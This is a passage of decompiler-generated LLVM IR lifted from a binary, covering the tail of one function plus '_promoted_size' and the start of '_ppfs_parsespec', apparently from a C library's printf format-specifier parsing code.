  br i1 %v1_10a90, label %dec_label_pc_10b1c, label %dec_label_pc_10af0

dec_label_pc_10a9c:                               ; preds = %dec_label_pc_10a8c
  %v7_10a9c = icmp eq i32 %v3_10a70, 7
  br i1 %v7_10a9c, label %dec_label_pc_10b04, label %dec_label_pc_10b1c

dec_label_pc_10aa4:                               ; preds = %dec_label_pc_10a7c
  %v7_10aa4 = icmp eq i32 %v3_10a70, 1024
  br i1 %v7_10aa4, label %dec_label_pc_10af0, label %dec_label_pc_10aac

dec_label_pc_10aac:                               ; preds = %dec_label_pc_10aa4
  %v8_10aac = icmp sgt i32 %v3_10a70, 1024
  br i1 %v8_10aac, label %dec_label_pc_10ac4, label %dec_label_pc_10ab0

dec_label_pc_10ab0:                               ; preds = %dec_label_pc_10aac
  switch i32 %v3_10a70, label %dec_label_pc_10b1c [
    i32 256, label %dec_label_pc_10af0
    i32 512, label %dec_label_pc_10af0
  ]

dec_label_pc_10ac4:                               ; preds = %dec_label_pc_10aac
  %v7_10ac4 = icmp eq i32 %v3_10a70, 2048
  br i1 %v7_10ac4, label %dec_label_pc_10adc, label %dec_label_pc_10ad4

dec_label_pc_10ad4:                               ; preds = %dec_label_pc_10ac4
  store i32 2055, i32* %r3.global-to-local, align 4
  %v9_10ad0 = icmp eq i32 %v3_10a70, 2055
  br i1 %v9_10ad0, label %dec_label_pc_10b04, label %dec_label_pc_10b1c

dec_label_pc_10adc:                               ; preds = %dec_label_pc_10ac4
  %v1_10adc = add i32 %v3_10a7c, 8
  store i32 %v1_10adc, i32* %r3.global-to-local, align 4
  store i32 %v1_10adc, i32* %v2_10a7c, align 4
  %v0_10ae4 = load i32, i32* %r1.global-to-local, align 4
  %v1_10ae4 = inttoptr i32 %v0_10ae4 to i32*
  %v2_10ae4 = load i32, i32* %v1_10ae4, align 4
  store i32 %v2_10ae4, i32* %r3.global-to-local, align 4
  %v3_10ae4 = add i32 %v0_10ae4, 4
  %v4_10ae4 = inttoptr i32 %v3_10ae4 to i32*
  %v5_10ae4 = load i32, i32* %v4_10ae4, align 4
  store i32 %v5_10ae4, i32* %r4.global-to-local, align 4
  %v0_10ae8 = load i32, i32* %ip.global-to-local, align 4
  %v1_10ae8 = inttoptr i32 %v0_10ae8 to i32*
  store i32 %v2_10ae4, i32* %v1_10ae8, align 4
  %v3_10ae8 = add i32 %v0_10ae8, 4
  %v4_10ae8 = inttoptr i32 %v3_10ae8 to i32*
  %v5_10ae8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_10ae8, i32* %v4_10ae8, align 4
  br label %dec_label_pc_10b2c

dec_label_pc_10af0:                               ; preds = %dec_label_pc_10ab0, %dec_label_pc_10ab0, %dec_label_pc_10a90, %dec_label_pc_10aa4, %dec_label_pc_10a84
  %v1_10af0 = inttoptr i32 %v3_10a7c to i32*
  %v2_10af0 = load i32, i32* %v1_10af0, align 4
  store i32 %v2_10af0, i32* %r2.global-to-local, align 4
  %v1_10af4 = add i32 %v3_10a7c, 4
  store i32 %v1_10af4, i32* %r3.global-to-local, align 4
  store i32 %v1_10af4, i32* %v2_10a7c, align 4
  %v0_10afc = load i32, i32* %r2.global-to-local, align 4
  %v1_10afc = load i32, i32* %ip.global-to-local, align 4
  %v2_10afc = inttoptr i32 %v1_10afc to i32*
  store i32 %v0_10afc, i32* %v2_10afc, align 4
  br label %dec_label_pc_10b2c

dec_label_pc_10b04:                               ; preds = %dec_label_pc_10a9c, %dec_label_pc_10ad4
  %v3_10b04 = load i32, i32* %v2_10a7c, align 4
  store i32 %v3_10b04, i32* %r3.global-to-local, align 4
  %v1_10b08 = inttoptr i32 %v3_10b04 to i32*
  %v2_10b08 = load i32, i32* %v1_10b08, align 4
  store i32 %v2_10b08, i32* %r1.global-to-local, align 4
  %v3_10b08 = add i32 %v3_10b04, 4
  %v4_10b08 = inttoptr i32 %v3_10b08 to i32*
  %v5_10b08 = load i32, i32* %v4_10b08, align 4
  store i32 %v5_10b08, i32* %r2.global-to-local, align 4
  %v1_10b0c = add i32 %v3_10b04, 8
  store i32 %v1_10b0c, i32* %r3.global-to-local, align 4
  store i32 %v1_10b0c, i32* %v2_10a7c, align 4
  %v0_10b14 = load i32, i32* %ip.global-to-local, align 4
  %v1_10b14 = inttoptr i32 %v0_10b14 to i32*
  %v2_10b14 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_10b14, i32* %v1_10b14, align 4
  %v3_10b14 = add i32 %v0_10b14, 4
  %v4_10b14 = inttoptr i32 %v3_10b14 to i32*
  %v5_10b14 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_10b14, i32* %v4_10b14, align 4
  br label %dec_label_pc_10b2c

dec_label_pc_10b1c:                               ; preds = %dec_label_pc_10ab0, %dec_label_pc_10a9c, %dec_label_pc_10a90, %dec_label_pc_10ad4
  %v1_10b1c = add i32 %v3_10a7c, 4
  store i32 %v1_10b1c, i32* %r3.global-to-local, align 4
  store i32 %v1_10b1c, i32* %v2_10a7c, align 4
  %v0_10b24 = load i32, i32* %r1.global-to-local, align 4
  %v1_10b24 = inttoptr i32 %v0_10b24 to i32*
  %v2_10b24 = load i32, i32* %v1_10b24, align 4
  store i32 %v2_10b24, i32* %r3.global-to-local, align 4
  %v1_10b28 = load i32, i32* %ip.global-to-local, align 4
  %v2_10b28 = inttoptr i32 %v1_10b28 to i32*
  store i32 %v2_10b24, i32* %v2_10b28, align 4
  br label %dec_label_pc_10b2c

dec_label_pc_10b2c:                               ; preds = %dec_label_pc_10b04, %dec_label_pc_10af0, %dec_label_pc_10adc, %dec_label_pc_10b1c
  %v0_10b2c = load i32, i32* %ip.global-to-local, align 4
  %v1_10b2c = add i32 %v0_10b2c, 8
  store i32 %v1_10b2c, i32* %ip.global-to-local, align 4
  %v0_10b30.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_10b34.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10b30

dec_label_pc_10b30:                               ; preds = %dec_label_pc_10a6c, %dec_label_pc_10b2c
  %v0_10b34 = phi i32 [ %v0_10b3425, %dec_label_pc_10a6c ], [ %v0_10b34.pre, %dec_label_pc_10b2c ]
  %v0_10b30 = phi i32 [ %v1_10a6c24, %dec_label_pc_10a6c ], [ %v0_10b30.pre, %dec_label_pc_10b2c ]
  %v1_10b30 = add i32 %v0_10b30, 1
  store i32 %v1_10b30, i32* %lr.global-to-local, align 4
  %v1_10b34 = add i32 %v0_10b34, 28
  %v2_10b34 = inttoptr i32 %v1_10b34 to i32*
  %v3_10b34 = load i32, i32* %v2_10b34, align 4
  store i32 %v3_10b34, i32* %r3.global-to-local, align 4
  %v5_10b3c = icmp slt i32 %v1_10b30, %v3_10b34
  br i1 %v5_10b3c, label %dec_label_pc_10a6c, label %dec_label_pc_10b34.dec_label_pc_10b40.loopexit_crit_edge

dec_label_pc_10b44:                               ; preds = %entry
  br i1 %v6_10a20, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_10b44
  %v2_10b48 = add i32 %v0_10a08, 36
  %v3_10b48 = inttoptr i32 %v2_10b48 to i8*
  %v4_10b48 = load i8, i8* %v3_10b48, align 1
  %v5_10b48 = zext i8 %v4_10b48 to i32
  %v5_10b4c = mul nuw nsw i32 %v5_10b48, 8
  %v6_10b4c = add i32 %v5_10b4c, %v1_10a14
  store i32 %v6_10b4c, i32* %r3.global-to-local, align 4
  %v2_10b50 = add i32 %v6_10b4c, -8
  %v3_10b50 = inttoptr i32 %v2_10b50 to i32*
  %v4_10b50 = load i32, i32* %v3_10b50, align 4
  store i32 %v4_10b50, i32* %r3.global-to-local, align 4
  store i32 %v4_10b50, i32* %v2_10a18, align 4
  %v0_10b58.pre = load i32, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_10b44, %bb
  %v2_10b6c = phi i32 [ %v0_10b58.pre, %bb ], [ %v0_10a08, %dec_label_pc_10b44 ]
  %v1_10b58 = add i32 %v2_10b6c, 4
  %v2_10b58 = inttoptr i32 %v1_10b58 to i32*
  %v3_10b58 = load i32, i32* %v2_10b58, align 4
  store i32 %v3_10b58, i32* %r3.global-to-local, align 4
  %v6_10b5c = icmp eq i32 %v3_10b58, -2147483648
  br i1 %v6_10b5c, label %bb15, label %dec_label_pc_10b40

bb15:                                             ; preds = %.thread2
  %v2_10b60 = add i32 %v2_10b6c, 37
  %v3_10b60 = inttoptr i32 %v2_10b60 to i8*
  %v4_10b60 = load i8, i8* %v3_10b60, align 1
  %v5_10b60 = zext i8 %v4_10b60 to i32
  %v1_10b64 = load i32, i32* %ip.global-to-local, align 4
  %v5_10b64 = mul nuw nsw i32 %v5_10b60, 8
  %v6_10b64 = add i32 %v5_10b64, %v1_10b64
  store i32 %v6_10b64, i32* %r3.global-to-local, align 4
  %v2_10b68 = add i32 %v6_10b64, -8
  %v3_10b68 = inttoptr i32 %v2_10b68 to i32*
  %v4_10b68 = load i32, i32* %v3_10b68, align 4
  store i32 %v4_10b68, i32* %r3.global-to-local, align 4
  store i32 %v4_10b68, i32* %v2_10b58, align 4
  %v0_10b70.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10b40

dec_label_pc_10b34.dec_label_pc_10b40.loopexit_crit_edge: ; preds = %dec_label_pc_10b30
  br label %dec_label_pc_10b40.loopexit

dec_label_pc_10b40.loopexit:                      ; preds = %dec_label_pc_10b34.dec_label_pc_10b40.loopexit_crit_edge, %dec_label_pc_10a64
  %v0_10b34.lcssa = phi i32 [ %v0_10b34, %dec_label_pc_10b34.dec_label_pc_10b40.loopexit_crit_edge ], [ %v0_10b3418, %dec_label_pc_10a64 ]
  br label %dec_label_pc_10b40

dec_label_pc_10b40:                               ; preds = %dec_label_pc_10b40.loopexit, %.thread2, %bb15
  %v1_10b90 = phi i32 [ %v0_10b34.lcssa, %dec_label_pc_10b40.loopexit ], [ %v2_10b6c, %.thread2 ], [ %v0_10b70.pre, %bb15 ]
  %v1_10b70 = add i32 %v1_10b90, 8
  %v2_10b70 = inttoptr i32 %v1_10b70 to i32*
  %v3_10b70 = load i32, i32* %v2_10b70, align 4
  store i32 %v3_10b70, i32* %r1.global-to-local, align 4
  %v1_10b74 = icmp slt i32 %v3_10b70, 0
  br i1 %v1_10b74, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_10b40
  %v5_10b78 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_10b78, i32* @r4, align 4
  ret i32 %v1_10b90

bb17:                                             ; preds = %dec_label_pc_10b40
  %v1_10b7c = add i32 %v1_10b90, 16
  %v2_10b7c = inttoptr i32 %v1_10b7c to i32*
  %v3_10b7c = load i32, i32* %v2_10b7c, align 4
  %v1_10b84 = sub i32 0, %v3_10b70
  store i32 %v1_10b84, i32* %r1.global-to-local, align 4
  %v1_10b80 = and i32 %v3_10b7c, -10
  %v1_10b88 = or i32 %v1_10b80, 8
  store i32 %v1_10b88, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_10b90 = add i32 %v1_10b90, 20
  %v3_10b90 = inttoptr i32 %v2_10b90 to i32*
  store i32 32, i32* %v3_10b90, align 4
  %v0_10b94 = load i32, i32* %r1.global-to-local, align 4
  %v1_10b94 = load i32, i32* @r0, align 4
  %v2_10b94 = add i32 %v1_10b94, 8
  %v3_10b94 = inttoptr i32 %v2_10b94 to i32*
  store i32 %v0_10b94, i32* %v3_10b94, align 4
  %v0_10b98 = load i32, i32* %r3.global-to-local, align 4
  %v1_10b98 = load i32, i32* @r0, align 4
  %v2_10b98 = add i32 %v1_10b98, 16
  %v3_10b98 = inttoptr i32 %v2_10b98 to i32*
  store i32 %v0_10b98, i32* %v3_10b98, align 4
  %v2_10b9c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10b9c, i32* @r4, align 4
  %v8_10b9c = load i32, i32* @r0, align 4
  ret i32 %v8_10b9c

; uselistorder directives
  uselistorder i32 %v1_10b30, { 2, 1, 0 }
  uselistorder i32 %v0_10b34, { 1, 2, 0 }
  uselistorder i32 %v3_10b04, { 0, 2, 1, 3 }
  uselistorder i32 %v3_10a7c, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_10a7c, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_10a70, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v1_10a6c24, { 1, 0 }
  uselistorder i32 %v0_10b3418, { 2, 0, 1 }
  uselistorder i32 %v0_10a08, { 0, 3, 1, 2, 5, 4, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 16, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_10b40, { 0, 2, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_10b30, { 1, 0 }
  uselistorder label %dec_label_pc_10b2c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10b1c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10b04, { 1, 0 }
  uselistorder label %dec_label_pc_10af0, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_10a6c, { 1, 0 }
  uselistorder label %dec_label_pc_10a64, { 1, 0 }
  uselistorder label %dec_label_pc_10a40, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_10bbc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10ba8

dec_label_pc_10ba8:                               ; preds = %dec_label_pc_10bc4, %entry
  %v0_10ba8 = phi i32 [ %v1_10ba8, %dec_label_pc_10bc4 ], [ ptrtoint (i32* @global_var_1a0e0.641 to i32), %entry ]
  %v1_10ba8 = add i32 %v0_10ba8, -2
  %v1_10bac = add i32 %v0_10ba8, -1
  %v2_10bac = inttoptr i32 %v1_10bac to i8*
  %v3_10bac = load i8, i8* %v2_10bac, align 1
  %v4_10bac = zext i8 %v3_10bac to i32
  %v1_10bb0 = inttoptr i32 %v1_10ba8 to i8*
  %v2_10bb0 = load i8, i8* %v1_10bb0, align 2
  %v3_10bb0 = zext i8 %v2_10bb0 to i32
  %v3_10bb4 = mul nuw i32 %v4_10bac, 16777216
  %v4_10bb8 = sdiv i32 %v3_10bb4, 65536
  %v5_10bb8 = or i32 %v4_10bb8, %v3_10bb0
  %v9_10bbc = icmp eq i32 %v5_10bb8, %v1_10bbc.pre
  br i1 %v9_10bbc, label %dec_label_pc_10ba8.dec_label_pc_10bd0_crit_edge, label %dec_label_pc_10bc4

dec_label_pc_10ba8.dec_label_pc_10bd0_crit_edge:  ; preds = %dec_label_pc_10ba8
  br label %dec_label_pc_10bd0

dec_label_pc_10bc4:                               ; preds = %dec_label_pc_10ba8
  %tmp = icmp ugt i32 %v1_10ba8, ptrtoint (i32* @global_var_1a0c8.643 to i32)
  br i1 %tmp, label %dec_label_pc_10ba8, label %dec_label_pc_10bd0

dec_label_pc_10bd0:                               ; preds = %dec_label_pc_10bc4, %dec_label_pc_10ba8.dec_label_pc_10bd0_crit_edge
  %v2_10bd8.pre-phi = sub i32 %v1_10ba8, ptrtoint (i32* @global_var_1a0c8.643 to i32)
  store i32 ptrtoint (i32* @global_var_1a0e0.641 to i32), i32* @r2, align 4
  %v4_10bdc = sdiv i32 %v2_10bd8.pre-phi, 2
  %v5_10bdc = add i32 %v4_10bdc, ptrtoint (i32* @global_var_1a0e0.641 to i32)
  %v6_10bdc = inttoptr i32 %v5_10bdc to i8*
  %v7_10bdc = load i8, i8* %v6_10bdc, align 1
  %v9_10bdc = zext i8 %v7_10bdc to i32
  ret i32 %v9_10bdc

; uselistorder directives
  uselistorder i32 %v1_10ba8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10ba8, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1a0e0.641 to i32), { 1, 2, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp106 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_10bf0 = load i32, i32* @r4, align 4
  store i32 %v3_10bf0, i32* %stack_var_-32, align 4
  %v6_10bf0 = load i32, i32* @r5, align 4
  %v25_10bf0 = ptrtoint i32* %stack_var_-32 to i32
  %v1_10bf4 = add i32 %tmp, 16
  %v2_10bf4 = inttoptr i32 %v1_10bf4 to i32*
  %v3_10bf4 = load i32, i32* %v2_10bf4, align 4
  %v2_10bf8 = ptrtoint i32* %stack_var_-88 to i32
  %v1_10bfc = and i32 %v3_10bf4, 128
  store i32 %v1_10bfc, i32* @r4, align 4
  %v2_10bfc = icmp eq i32 %v1_10bfc, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r7.global-to-local, align 4
  %v1_10c1c = add i32 %tmp, 24
  %v2_10c1c = inttoptr i32 %v1_10c1c to i32*
  %v3_10c1c = load i32, i32* %v2_10c1c, align 4
  store i32 %v3_10c1c, i32* %sb.global-to-local, align 4
  br i1 %v2_10bfc, label %bb, label %dec_label_pc_10c3c

bb:                                               ; preds = %entry
  %v3_10c20 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_10c88

dec_label_pc_10c2c:                               ; preds = %dec_label_pc_10e0c
  %v0_10c2c = load i32, i32* %r0.global-to-local, align 4
  %v0_10e3c.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10e34

dec_label_pc_10c34:                               ; preds = %dec_label_pc_10e38
  %v1_10c34 = add i32 %v0_10e3c.pre, 1
  store i32 %v1_10c34, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10e54

dec_label_pc_10c3c:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10c40

dec_label_pc_10c40:                               ; preds = %dec_label_pc_10c74.dec_label_pc_10c40_crit_edge, %dec_label_pc_10c3c
  %v1_10c50 = phi i32 [ %v1_10c64, %dec_label_pc_10c74.dec_label_pc_10c40_crit_edge ], [ 0, %dec_label_pc_10c3c ]
  %v0_10c40 = phi i32 [ %v0_10c40.pre, %dec_label_pc_10c74.dec_label_pc_10c40_crit_edge ], [ %tmp, %dec_label_pc_10c3c ]
  %v1_10c40 = inttoptr i32 %v0_10c40 to i32*
  %v2_10c40 = load i32, i32* %v1_10c40, align 4
  %v4_10c44 = mul i32 %v1_10c50, 4
  %v5_10c44 = add i32 %v2_10c40, %v4_10c44
  store i32 %v5_10c44, i32* %r3.global-to-local, align 4
  %v1_10c48 = add i32 %v5_10c44, -4
  %v2_10c48 = inttoptr i32 %v1_10c48 to i32*
  %v3_10c48 = load i32, i32* %v2_10c48, align 4
  store i32 %v3_10c48, i32* %r1.global-to-local, align 4
  store i32 %v25_10bf0, i32* @ip, align 4
  %v2_10c50 = add i32 %v1_10c50, %v25_10bf0
  store i32 %v2_10c50, i32* %r2.global-to-local, align 4
  %v1_10c54 = trunc i32 %v3_10c48 to i8
  %v3_10c54 = add i32 %v2_10c50, -56
  %v4_10c54 = inttoptr i32 %v3_10c54 to i8*
  store i8 %v1_10c54, i8* %v4_10c54, align 1
  %v0_10c58 = load i32, i32* %r2.global-to-local, align 4
  %v1_10c58 = add i32 %v0_10c58, -56
  %v2_10c58 = inttoptr i32 %v1_10c58 to i8*
  %v3_10c58 = load i8, i8* %v2_10c58, align 1
  %v4_10c58 = zext i8 %v3_10c58 to i32
  store i32 %v4_10c58, i32* %r2.global-to-local, align 4
  %v0_10c5c = load i32, i32* %r3.global-to-local, align 4
  %v1_10c5c = add i32 %v0_10c5c, -4
  %v2_10c5c = inttoptr i32 %v1_10c5c to i32*
  %v3_10c5c = load i32, i32* %v2_10c5c, align 4
  store i32 %v3_10c5c, i32* %r3.global-to-local, align 4
  %v9_10c60 = icmp eq i32 %v4_10c58, %v3_10c5c
  %v0_10c64 = load i32, i32* %r0.global-to-local, align 4
  %v1_10c64 = add i32 %v0_10c64, 1
  store i32 %v1_10c64, i32* %r0.global-to-local, align 4
  br i1 %v9_10c60, label %dec_label_pc_10c6c, label %dec_label_pc_11084

dec_label_pc_10c6c:                               ; preds = %dec_label_pc_10c40
  %v2_10c6c = icmp eq i8 %v3_10c58, 0
  br i1 %v2_10c6c, label %dec_label_pc_10c7c, label %dec_label_pc_10c74

dec_label_pc_10c74:                               ; preds = %dec_label_pc_10c6c
  %tmp166 = icmp ult i32 %v1_10c64, 32
  br i1 %tmp166, label %dec_label_pc_10c74.dec_label_pc_10c40_crit_edge, label %dec_label_pc_10c7c

dec_label_pc_10c74.dec_label_pc_10c40_crit_edge:  ; preds = %dec_label_pc_10c74
  %v0_10c40.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10c40

dec_label_pc_10c7c:                               ; preds = %dec_label_pc_10c74, %dec_label_pc_10c6c
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_10c84 = ptrtoint i32* %stack_var_-87 to i32
  br label %dec_label_pc_10c88

dec_label_pc_10c88:                               ; preds = %bb, %dec_label_pc_10c7c
  %storemerge102 = phi i32 [ %v2_10c84, %dec_label_pc_10c7c ], [ %v3_10c20, %bb ]
  store i32 %storemerge102, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_10c98

dec_label_pc_10c94:                               ; preds = %.thread22, %dec_label_pc_10da4
  %v0_10c94 = phi i32 [ %v2_10e1c, %.thread22 ], [ %storemerge105, %dec_label_pc_10da4 ]
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.3, %.thread22 ], [ %stack_var_-48.2, %dec_label_pc_10da4 ]
  store i32 %v0_10c94, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10c98

dec_label_pc_10c98:                               ; preds = %dec_label_pc_10c88, %dec_label_pc_10c94
  %v1_10cb4 = phi i32 [ %storemerge102, %dec_label_pc_10c88 ], [ %v0_10c94, %dec_label_pc_10c94 ]
  %stack_var_-48.1 = phi i32 [ %tmp106, %dec_label_pc_10c88 ], [ %stack_var_-48.0, %dec_label_pc_10c94 ]
  %v1_10c98 = inttoptr i32 %v1_10cb4 to i8*
  %v2_10c98 = load i8, i8* %v1_10c98, align 1
  %v3_10c98 = zext i8 %v2_10c98 to i32
  store i32 %v3_10c98, i32* %r3.global-to-local, align 4
  %v7_10c9c = icmp eq i8 %v2_10c98, 42
  br i1 %v7_10c9c, label %bb124, label %.thread9.thread

.thread9.thread:                                  ; preds = %dec_label_pc_10c98
  store i32 %v1_10cb4, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

bb124:                                            ; preds = %dec_label_pc_10c98
  %v1_10ca8 = load i32, i32* @lr, align 4
  %v4_10ca8 = mul i32 %v1_10ca8, -4
  %v5_10ca8 = add i32 %v4_10ca8, %v25_10bf0
  store i32 %v5_10ca8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_10cb4 = add i32 %v1_10cb4, 1
  store i32 %v2_10cb4, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10cbc = add i32 %v5_10ca8, -12
  %v4_10cbc = inttoptr i32 %v3_10cbc to i32*
  store i32 0, i32* %v4_10cbc, align 4
  %v0_10ce0.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb124, %.thread9.thread
  %v0_10ce0.pre = phi i32 [ %v0_10ce0.pre.pre, %bb124 ], [ %v1_10cb4, %.thread9.thread ]
  %v2_10ce4.pre = load i32, i32* @global_var_23df4, align 4
  br label %.backedge

dec_label_pc_10cc4:                               ; preds = %.backedge
  store i32 4094, i32* %r3.global-to-local, align 4
  %v0_10cc8 = load i32, i32* %r0.global-to-local, align 4
  %v7_10ccc = icmp sgt i32 %v0_10cc8, 4094
  br i1 %v7_10ccc, label %.thread12, label %bb126

.thread12:                                        ; preds = %dec_label_pc_10cc4
  %v1_10cd414 = add i32 %v0_10d58, 1
  store i32 %v1_10cd414, i32* %r6.global-to-local, align 4
  br label %.backedge

bb126:                                            ; preds = %dec_label_pc_10cc4
  %v11_10cd0 = mul i32 %v0_10cc8, 10
  %v12_10cd0 = add i32 %v11_10cd0, %v3_10ce0
  store i32 %v12_10cd0, i32* %r3.global-to-local, align 4
  %v1_10cd4 = add i32 %v0_10d58, 1
  store i32 %v1_10cd4, i32* %r6.global-to-local, align 4
  %v9_10cd8 = add i32 %v12_10cd0, -48
  store i32 %v9_10cd8, i32* %r0.global-to-local, align 4
  br label %.backedge

.backedge:                                        ; preds = %.thread12, %bb126, %.preheader
  %v0_10d58 = phi i32 [ %v0_10ce0.pre, %.preheader ], [ %v1_10cd4, %bb126 ], [ %v1_10cd414, %.thread12 ]
  store i32 ptrtoint (i32* @global_var_23df4 to i32), i32* %r3.global-to-local, align 4
  %v1_10ce0 = inttoptr i32 %v0_10d58 to i8*
  %v2_10ce0 = load i8, i8* %v1_10ce0, align 1
  %v3_10ce0 = zext i8 %v2_10ce0 to i32
  store i32 %v3_10ce0, i32* %r2.global-to-local, align 4
  store i32 %v2_10ce4.pre, i32* %r3.global-to-local, align 4
  %v3_10ce8 = mul nuw nsw i32 %v3_10ce0, 2
  %v4_10ce8 = add i32 %v3_10ce8, %v2_10ce4.pre
  %v5_10ce8 = inttoptr i32 %v4_10ce8 to i8*
  %v6_10ce8 = load i8, i8* %v5_10ce8, align 1
  %v8_10ce8 = zext i8 %v6_10ce8 to i32
  store i32 %v8_10ce8, i32* %r3.global-to-local, align 4
  %v1_10cec = and i32 %v8_10ce8, 8
  %v2_10cec = icmp eq i32 %v1_10cec, 0
  br i1 %v2_10cec, label %dec_label_pc_10cf4, label %dec_label_pc_10cc4

dec_label_pc_10cf4:                               ; preds = %.backedge
  %v0_10cf4 = load i32, i32* %r1.global-to-local, align 4
  %v1_10cf4 = add i32 %v0_10cf4, -1
  %v2_10cf4 = inttoptr i32 %v1_10cf4 to i8*
  %v3_10cf4 = load i8, i8* %v2_10cf4, align 1
  %v4_10cf4 = zext i8 %v3_10cf4 to i32
  store i32 %v4_10cf4, i32* %r3.global-to-local, align 4
  %v7_10cf8 = icmp eq i8 %v3_10cf4, 37
  br i1 %v7_10cf8, label %dec_label_pc_10d00, label %dec_label_pc_10dbc

dec_label_pc_10d00:                               ; preds = %dec_label_pc_10cf4
  %v7_10d00 = icmp eq i8 %v2_10ce0, 36
  %. = zext i1 %v7_10d00 to i32
  store i32 %., i32* @ip, align 4
  %v0_10d0c = load i32, i32* %r0.global-to-local, align 4
  %tmp129 = icmp slt i32 %v0_10d0c, 1
  br i1 %tmp129, label %bb130, label %thread-pre-split

bb130:                                            ; preds = %dec_label_pc_10d00
  store i32 0, i32* @ip, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_10d00, %bb130
  %v1_10d68 = phi i32 [ 0, %bb130 ], [ %., %dec_label_pc_10d00 ]
  %v2_10d14 = icmp eq i32 %v1_10d68, 0
  %v0_10d44 = load i32, i32* %sb.global-to-local, align 4
  br i1 %v2_10d14, label %dec_label_pc_10d44, label %dec_label_pc_10d1c

dec_label_pc_10d1c:                               ; preds = %thread-pre-split
  %v2_10d44 = icmp eq i32 %v0_10d44, 0
  %v1_10d20 = add i32 %v0_10d58, 1
  store i32 %v1_10d20, i32* %r1.global-to-local, align 4
  br i1 %v2_10d44, label %dec_label_pc_11084, label %dec_label_pc_10d28

dec_label_pc_10d28:                               ; preds = %dec_label_pc_10d1c
  %v2_10d28 = sub i32 %v0_10d0c, %v0_10d44
  %v4_10d28 = xor i32 %v0_10d44, %v0_10d0c
  %v5_10d28 = xor i32 %v2_10d28, %v0_10d0c
  %v6_10d28 = and i32 %v5_10d28, %v4_10d28
  %v7_10d28 = icmp slt i32 %v6_10d28, 0
  %v8_10d28 = icmp slt i32 %v2_10d28, 0
  %v9_10d28 = icmp eq i32 %v0_10d0c, %v0_10d44
  %v3_10d2c = xor i1 %v8_10d28, %v7_10d28
  %v4_10d2c = or i1 %v9_10d28, %v3_10d2c
  br i1 %v4_10d2c, label %dec_label_pc_10d3c, label %bb131

bb131:                                            ; preds = %dec_label_pc_10d28
  store i32 %v0_10d0c, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_10d3c

dec_label_pc_10d38:                               ; preds = %dec_label_pc_10d58, %dec_label_pc_10d60
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_10d3c

dec_label_pc_10d3c:                               ; preds = %bb131, %dec_label_pc_10d28, %dec_label_pc_10d38
  %v0_10d3c = phi i32 [ %v0_10cf4, %dec_label_pc_10d38 ], [ %v1_10d20, %dec_label_pc_10d28 ], [ %v1_10d20, %bb131 ]
